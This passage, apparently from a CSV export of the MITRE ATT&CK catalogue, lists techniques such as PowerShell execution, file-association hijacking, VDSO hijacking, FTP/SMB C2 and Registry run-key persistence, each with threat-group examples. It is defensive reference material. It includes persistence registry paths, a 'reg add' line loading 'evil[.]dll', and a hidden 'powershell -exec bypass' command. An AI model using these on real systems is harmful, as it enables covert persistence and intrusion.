PowerShell to set persistence. ', '[Akira] will execute PowerShell commands to delete system volume shadow copies.', 'During [Operation Dream Job] [Lazarus Group] used PowerShell commands to explore the environment of compromised victims.', '[DarkWatchman] can execute PowerShell commands and has used PowerShell to execute a keylogger.', '[GLASSTOKEN] can use PowerShell for command execution.', '[PowerShower] is a backdoor written in PowerShell.', '[FIN7] used a PowerShell script to launch shellcode that retrieved an additional payload.', '[LitePower] can use a PowerShell script to execute commands.', '[Mafalda] can execute PowerShell commands on a compromised machine.', 'During [Frankenstein] the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.', '[Ember Bear] has used PowerShell to download and execute malicious code.', '[TeamTNT] has executed PowerShell commands in batch scripts.', '[OilRig] has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.', 'The [NETWIRE] binary has been executed via PowerShell script.', '[PowerPunch] has the ability to execute through PowerShell.', '[POWERTON] is written in PowerShell.', '[Mosquito] can launch PowerShell Scripts.', '[Hancitor] has used PowerShell to execute commands.', '[Inception] has used PowerShell to execute malicious commands and payloads.', '[Cuba] has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.', 'One version of [Helminth] uses a PowerShell script.', '[PS1] can utilize a PowerShell loader.', '[Pysa] has used Powershell scripts to deploy its ransomware. ', '[Lazarus Group] has used PowerShell to execute commands and malicious code.', '[SharpStage] can execute arbitrary commands with PowerShell.', '[APT32] has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.', '[Chimera] has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.\t', '[Koadic] has used PowerShell to establish persistence. ', '[Volt Typhoon] has used PowerShell including for remote system discovery.', '[njRAT] has executed PowerShell commands via auto-run registry key persistence.', '[FlawedAmmyy] has used PowerShell to execute commands.', '[Earth Lusca] has used PowerShell to execute commands.', '[Threat Group-3390] has used PowerShell for execution.', '[TA2541] has used PowerShell to download files and to inject into various Windows processes.', '[Deep Panda] has used PowerShell scripts to download and execute programs in memory, without writing to disk.', '[Indrik Spider] has used PowerShell [Empire] for execution of malware. ', '[Cobalt Group] has used powershell.exe to download and execute scripts.', '[Leviathan] has used PowerShell for execution.', '[Cobalt Strike] can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. [Cobalt Strike] can also use [PowerSploit] and other scripting frameworks to perform execution.', ""[Wizard Spider] has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network."", '[KONNI] used PowerShell to download and execute a specific 64-bit version of the malware. ', '[Socksbot] can write and execute PowerShell scripts.', 'During [C0018] the threat actors used encoded PowerShell scripts for execution.', '[Emotet] has used Powershell to retrieve the malicious payload and download additional resources like [Mimikatz] ', '[APT29] has used encoded PowerShell scripts uploaded to [CozyCar] installations to download and install [SeaDuke]', '[Saint Bot] has used PowerShell for execution.', '[WarzoneRAT] can use PowerShell to download files and execute commands.', '[RegDuke] can extract and execute PowerShell scripts from C2 communications.', '[GALLIUM] used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.', '[CharmPower] can use PowerShell for payload execution and C2 communication.', '[Meteor] can use PowerShell commands to disable the network adapters on a victim machines.', '[SILENTTRINITY] can use PowerShell to execute commands.', '[POWERSOURCE] is a PowerShell backdoor.', '[ServHelper] has the ability to execute a PowerShell script to get information from the infected host.', '[Xbash] can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.', ""[Ursnif] droppers have used PowerShell in download cradles to download and execute the malware's full executable payload."", '[POSHSPY] uses PowerShell to execute various commands, one to execute its payload.', '[PUNCHBUGGY] has used [PowerShell] scripts.', '[SHARPSTATS] has the ability to employ a custom PowerShell script.', '[ConnectWise] can be used to execute PowerShell commands on target machines.', '[POWERSTATS] uses PowerShell for obfuscation and execution.', '[Black Basta] has used PowerShell scripts for discovery and to execute files over the network.', '[StrongPity] can use PowerShell to add files to the Windows Defender exclusions list.', 'During the [SolarWinds Compromise] [APT29] used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.', "" [FIN6] has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener."", '[Netwalker] has been written in PowerShell and executed directly in memory, avoiding detection.', '[Lizar] has used PowerShell scripts.', '[HEXANE] has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.', '[LazyScripter] has used PowerShell scripts to execute malicious code.', '[Ferocious] can use PowerShell scripts for execution.', '[HAFNIUM] has used the Exchange Power Shell module <code>Set-OabVirtualDirectoryPowerShell</code> to export mailbox data.', '[HAMMERTOSS] is known to use PowerShell.', '[Sidewinder] has used PowerShell to drop and execute malware loaders.', '[FIN10] uses PowerShell for execution as well as PowerShell Empire to establish persistence.', '[BloodHound] can use PowerShell to pull Active Directory information from the target environment.', '[PowGoop] has the ability to use PowerShell scripts to execute commands.', '[Pillowmint] has used a PowerShell script to install a shim database.\t', '[Prestige] can use PowerShell for payload execution on targeted systems.', '[Gallmaker] used PowerShell to download additional payloads and for execution.', '[Denis] has a version written in PowerShell.\t', '[Turla] has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from [Empire] PSInject. [Turla] has also used PowerShell scripts to load and execute malware in memory.', '[CreepyDrive] can use Powershell for execution, including the cmdlets `Invoke-WebRequest` and `Invoke-Expression`.', '[Silence] has used PowerShell to download and execute payloads.', '[Revenge RAT] uses the PowerShell command <code>Reflection.Assembly</code> to load itself into memory to aid in execution.', '[PyDCrypt] has attempted to execute with PowerShell.', '[Molerats] used PowerShell implants on target machines.', '[Bandook] has used PowerShell loaders as part of execution.', '[ToddyCat] has used Powershell scripts to perform post exploit collection.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] used a publicly available PowerShell-based tool, WMImplant.', '[POWRUNER] is written in PowerShell.', 'During the [C0032] campaign, [TEMP.Veles] used PowerShell to perform timestomping.', '[KeyBoy] uses PowerShell commands to download and execute payloads.', '[APT3] has used PowerShell on victim systems to download and run payloads after exploitation.', '[CreepySnail] can use PowerShell for execution, including the cmdlets `Invoke-WebRequst` and `Invoke-Expression`.', '[ComRAT] has used PowerShell to load itself every time a user logs in to the system. [ComRAT] can execute PowerShell scripts loaded into memory or from the file system.', '[Donut] can generate shellcode outputs that execute via PowerShell.\t', '[HALFBAKED] can execute PowerShell scripts.', '[DarkVishnya] used PowerShell to create shellcode loaders.', '[PowerLess] is written in and executed via PowerShell without using powershell.exe.', '[TA459] has used PowerShell for execution of a payload.', '[Gamaredon Group] has used obfuscated PowerShell scripts for staging.', '[Kimsuky] has executed a variety of PowerShell scripts.', 'During [Operation Wocao] threat actors used PowerShell on compromised systems.', '[KOCTOPUS] has used PowerShell commands to download additional files.', 'During [C0021] the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.', '[TA505] has used PowerShell to download and execute malware and reconnaissance scripts.', '[Lokibot] has used PowerShell commands embedded inside batch scripts. ', '[FatDuke] has the ability to execute PowerShell scripts.', '[FIN8] malicious spearphishing payloads are executed as [PowerShell] [FIN8] has also used [PowerShell] for lateral movement and credential access.', '[APT33] has utilized PowerShell to download files from the C2 server and run various scripts. ', ""[KGH_SPY] can execute PowerShell commands on the victim's machine."", '[BRONZE BUTLER] has used PowerShell for execution.', '[Mustang Panda] has used malicious PowerShell scripts to enable execution.', '[QUADAGENT] uses PowerShell scripts for execution.', '[SMOKEDHAM] can execute Powershell commands sent from its C2 server.', '[Bumblebee] can use PowerShell for execution.', ""[Patchwork] used [PowerSploit] to download payloads, run a reverse shell, and execute malware on the victim's machine."", '[Tonto Team] has used PowerShell to download additional payloads.', '[CrackMapExec] can execute PowerShell commands via WMI.', '[APT38] has used PowerShell to execute commands and other operational tasks.', '[DarkHydrus] leveraged PowerShell to download and execute additional scripts for execution.', '[GOLD SOUTHFIELD] has staged and executed PowerShell scripts on compromised hosts.', 'The [Clambling] dropper can use PowerShell to download the malware.', '[menuPass] uses [PowerSploit] to inject shellcode into PowerShell.', '[Valak] has used PowerShell to download additional modules.', 'The [Poseidon Group] Information Gathering Tool (IGT) includes PowerShell components.', '[Stealth Falcon] malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.', '[Squirrelwaffle] has used PowerShell to execute its payload.', '[DownPaper] uses PowerShell for execution.', '[AutoIt backdoor] downloads a PowerShell script that decodes to a typical shellcode loader.', '[RogueRobin] uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, [RogueRobin] creates <code>%APPDATA%\\OneDrive.bat</code> and saves the following string to it:<code>powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”</code>.', '[SeaDuke] uses a module to execute Mimikatz with PowerShell to perform [Pass the Ticket]', '[PowerSploit] modules are written in and executed via [PowerShell]', '[MuddyWater] has used PowerShell for execution.', '[Fox Kitten] has used PowerShell scripts to access credential data.', '[Cinnamon Tempest] has used PowerShell to communicate with C2, download files, and execute reconnaissance commands.', 'There is a variant of [RATANKBA] that uses a PowerShell script instead of the traditional PE form.', '[Egregor] has used an encoded PowerShell command by a service created by [Cobalt Strike] for lateral movement.', '[OSX_OCEANLOTUS.D] uses PowerShell scripts.', '[AADInternals] is written and executed via PowerShell.', '[Sardonic] has the ability to execute PowerShell commands on a compromised machine.', '[Dragonfly] has used PowerShell scripts for execution.', '[GRIFFON] has used PowerShell to execute the Meterpreter downloader TinyMet.', '[Aquatic Panda] has downloaded additional scripts and executed Base64 encoded commands in PowerShell.', '[Snip3] can use a PowerShell script for second-stage execution.', '[BONDUPDATER] is written in PowerShell.', '[SQLRat] has used PowerShell to create a Meterpreter session.', '[Confucius] has used PowerShell to execute malicious files and payloads.', '[Nomadic Octopus] has used PowerShell for execution. ', '[JSS Loader] has the ability to download and execute PowerShell scripts.', '[TEMP.Veles] has used a publicly-available PowerShell-based tool, WMImplant. The group has also used PowerShell to perform [Timestomp]', '[UNC2452] used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and to execute other commands.', '[Operation Wocao] has used PowerShell on compromised systems.', '[Frankenstein] has used PowerShell to run a series of base64-encoded commands, that acted as a stager and enumerated hosts.\t', '[Dragonfly 2.0] used PowerShell scripts for execution.', '[Lazarus Group] has used Powershell to download malicious payloads.', '[Cobalt Strike] can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. [Cobalt Strike] can also use [PowerSploit] and other scripting frameworks to perform execution.']",False
T1546.001,Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.  System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. For example:   * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>  The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.","['[SILENTTRINITY] can conduct an image hijack of an `.msc` file extension as part of its UAC bypass process.', '[Kimsuky] has a HWP document stealer module which changes the default program association in the registry to open HWP documents.']",False
T1055.014,VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process.   VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls] However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",[],False
T1071.002,File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.   Protocols such as SMB, FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","['[PoetRAT] has used FTP for C2 communications.', '[APT41] used exploit payloads that initiate download via [ftp]', '[Mythic] supports SMB-based peer-to-peer C2 profiles.\t', '[CARROTBALL] has the ability to use FTP in C2 communications.', 'The [Regin] malware platform supports many standard protocols, including SMB.', '[Machete] uses FTP for Command & Control.', '[XAgentOSX] contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.', '[JPIN] can communicate over FTP.', '[Kazuar] uses FTP and FTPS to communicate with the C2 server.', '[Attor] has used FTP protocol for C2 communication.', '[SharpDisco] has the ability to transfer data between SMB shares.', 'During [Operation Honeybee] the threat actors had the ability to use FTP for C2.', '[ZxShell] has used FTP for C2 connections. ', '[ShadowPad] has used FTP for C2 communications.', '[Dragonfly] has used SMB for C2.', '[SYSCON] has the ability to use FTP in C2 communications.', '[SilverTerrier] uses FTP for C2 communications.\t', '[BADHATCH] can emulate an FTP server to connect to actor-controlled C2 servers.', '[Cobalt Strike] can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.', '[Disco] can use SMB to transfer files.', '[Kimsuky] has used FTP to download additional malware to the target machine.', '[NOKKI] has used FTP for C2 communications.', '[Honeybee] uses FTP for command and control.', '[Machete] malware used FTP for C2.']",False
T1546.014,Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon] that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.  The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon] configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.  Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon] service.",[],False
T1102.003,One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.  Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","['[EVILNUM] has used a one-way communication method via GitLab and Digital Point to perform C2.', '[Leviathan] has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.', '[Metamorfo] has downloaded a zip file for execution on the system. ', '[OnionDuke] uses Twitter as a backup C2.', 'The ""tDiscoverer"" variant of [HAMMERTOSS] establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. [HAMMERTOSS] binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.']",
T1574.010,Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.  Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","[""One variant of [BlackEnergy] locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.""]",
T1547.001,Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.  The following run keys are created by default on Windows systems:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>  Run keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code>   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.  The following Registry keys can be used to set startup folder items for persistence:  * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>  The following Registry keys can control automatic startup of services during boot:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>  Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:  * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>  Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.  By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.  Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading] to make the Registry entries look as if they are associated with legitimate programs.","['Variants of [Emissary] have added Run Registry keys to establish persistence.', '[Pisloader] establishes persistence via a Registry Run key.', '[EvilBunny] has created Registry keys for persistence in <code>[HKLM|HKCU]\\…\\CurrentVersion\\Run</code>.\t', 'An [APT19] HTTP malware variant establishes persistence by setting the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\</code>.', '[APT37] has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code>.', '[APT39] has maintained persistence using the startup folder.', '[NETWIRE] creates a Registry start-up entry to establish persistence.', '[TA2541] has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.', '[Ursnif] has used Registry Run keys to establish automatic execution at system startup.', '[Backdoor.Oldrea] adds Registry Run keys to achieve persistence.', '[SHIPSHAPE] achieves persistence by creating a shortcut in the Startup folder.', '[RTM] has used Registry run keys to establish persistence for the [RTM] Trojan and other tools, such as a modified version of TeamViewer remote desktop software.', '[Magic Hound] malware has used Registry Run keys to establish persistence.', '[FunnyDream] can use a Registry Run Key and the Startup folder to establish persistence.', '[Agent Tesla] can add itself to the Registry as a startup program to establish persistence. ', ""[AuTo Stealer] can place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence."", '[Rover] persists by creating a Registry entry in <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>.', '[FinFisher] establishes persistence by creating the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\Run</code>.', '[WarzoneRAT] can add itself to the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` and `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK` Registry keys.', '[Maze] has created a file named ""startup_vrun.bat"" in the Startup folder of a virtual machine to establish persistence.', '[Final1stspy] creates a Registry Run key to establish persistence.', '[BadPatch] establishes a foothold by adding a link to the malware executable in the startup folder.', '[Inception] has maintained persistence by modifying Registry run key value   <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>.', ""During [Operation Dream Job] [Lazarus Group] placed LNK files into the victims' startup folder for persistence. "", '[APT28] has deployed malware that has copied itself to the startup directory for persistence.', '[TeamTNT] has added batch scripts to the startup folder.', '[Remcos] can add itself to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.', '[Kazuar] adds a sub-key under several Registry run keys.', '[EVILNUM] can achieve persistence through the Registry Run key.', '[JCry] has created payloads in the Startup directory to maintain persistence. ', '[Cobian RAT] creates an autostart Registry key to ensure persistence.', '[PoisonIvy] creates run key Registry entries pointing to a malicious executable dropped to disk.', ""[Carberp] has maintained persistence by placing itself inside the current user's startup folder."", '[Lucifer] can persist by setting Registry key values <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code>.', '[GrimAgent] can set persistence with a Registry run key.', '[HTTPBrowser] has established persistence by setting the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key value for <code>wdm</code> to the path of the executable. It has also used the Registry entry <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe”</code> to establish persistence.', '[ThreatNeedle] can be loaded into the Startup folder (`%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk`) as a Shortcut file for persistence.', '[ADVSTORESHELL] achieves persistence by adding itself to the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.', '[Leviathan] has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.', '[Helminth] establishes persistence by creating a shortcut in the Start Menu folder.', ""[Naikon] has modified a victim's Windows Run registry to establish persistence."", '[DarkTortilla] has established persistence via the `Software\\Microsoft\\Windows NT\\CurrentVersion\\Run` registry key and by creating a .lnk shortcut file in the Windows startup folder.', '[QakBot] can maintain persistence by creating an auto-run Registry key.', '[Silence] has used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>, and the Startup folder to establish persistence.\t', '[Gelsemium] can set persistence with a Registry run key.', '[ChChes] establishes persistence by adding a Registry Run key.', '[Gazer] can establish persistence by creating a .lnk file in the Start menu.', '[Gorgon Group] malware can create a .lnk file and add a Registry Run key to establish persistence.', '[Crimson] can add Registry run keys for persistence.', '[Emotet] has been observed adding the downloaded payload to the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key to maintain persistence.', 'One persistence mechanism used by [CozyCar] is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>', '[Xbash] can create a Startup item for persistence if it determines it is on a Windows system.', '[InvisiMole] can place a lnk file in the Startup Folder to achieve persistence.', '[APT29] added Registry Run keys to establish persistence.', '[SharpStage] has the ability to create persistence for the malware using the Registry autorun key and startup folder. ', '[Clambling] can establish persistence by adding a Registry run key.', '[RTM] tries to add a Registry Run key under the name ""Windows Update"" to establish persistence.', 'Most [Sakula] samples maintain persistence by setting the Registry Run key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> in the HKLM or HKCU hive, with the Registry value and file name varying by sample.', '[ZIRCONIUM] has created a Registry Run key named <code>Dropbox Update Setup</code> to establish persistence for a malicious Python binary.', '[Reaver] creates a shortcut file and saves it in a Startup folder to establish persistence.', 'If the [QuasarRAT] client process does not have administrator privileges it will add a registry key to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence. ', ""[FLASHFLOOD] achieves persistence by making an entry in the Registry's Run key."", '[LoJax] has modified the Registry key <code>‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’</code> from <code>‘autocheck autochk *’</code> to <code>‘autocheck autoche *’</code> in order to execute its payload during Windows startup.', '[Patchwork] has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.', '[STARWHALE] can establish persistence by installing itself in the startup folder, whereas the GO variant has created a `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM` registry key.', '[FlawedAmmyy] has established persistence via the `HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run` registry key.', '[Pteranodon] copies itself to the Startup folder to establish persistence.', '[MarkiRAT] can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.', '[Matryoshka] can establish persistence by adding Registry Run keys.', '[DarkGate] installation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder. [DarkGate] installation finishes with the creation of a registry Run key.', 'A version of [KONNI] has dropped a Windows shortcut into the Startup folder to establish persistence.', '[Vasport] copies itself to disk and creates an associated run key Registry entry to establish.', ""[ObliqueRAT] can gain persistence by a creating a shortcut in the infected user's Startup directory."", '[Ixeshe] can achieve persistence by adding itself to the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.', '[BBSRAT] has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe</code>.', '[FIN6] has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.', '[Metamorfo] has configured persistence to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe</code> and used .LNK files in the startup folder to achieve persistence.', '[AvosLocker] has been executed via the `RunOnce` Registry key to run itself on safe mode.', '[Snip3] can create a VBS file in startup to persist after system restarts.', '[Hi-Zor] creates a Registry Run key to establish persistence.', 'A [Turla] Javascript backdoor added a local_update_check value under the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence. Additionally, a [Turla] custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.', '[Smoke Loader] adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.', '[build_downer] has the ability to add itself to the Registry Run key for persistence.', '[Rifdoor] has created a new registry entry at <code>HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics</code> with a value of <code>C:\\ProgramData\\Initech\\Initech.exe /run</code>.', '[Nebulae] can achieve persistence through a Registry Run key.', '[NOKKI] has established persistence by writing the payload to the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>.', '[Grandoreiro] can use run keys and create link files in the startup folder for persistence.', 'A dropper used by [Putter Panda] installs itself into the ASEP Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> with a value named McUpdate.', '[PUNCHBUGGY] has been observed using a Registry Run key.', '[MuddyWater] has added Registry Run key <code>KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding</code> to establish persistence.', '[Truvasys] adds a Registry Run key to establish persistence.', '[Hancitor]  has added Registry Run keys to establish persistence.', '[Trojan.Karagany] can create a link to itself in the Startup folder to automatically start itself upon system restart.', '[Mivast] creates the following Registry entry: 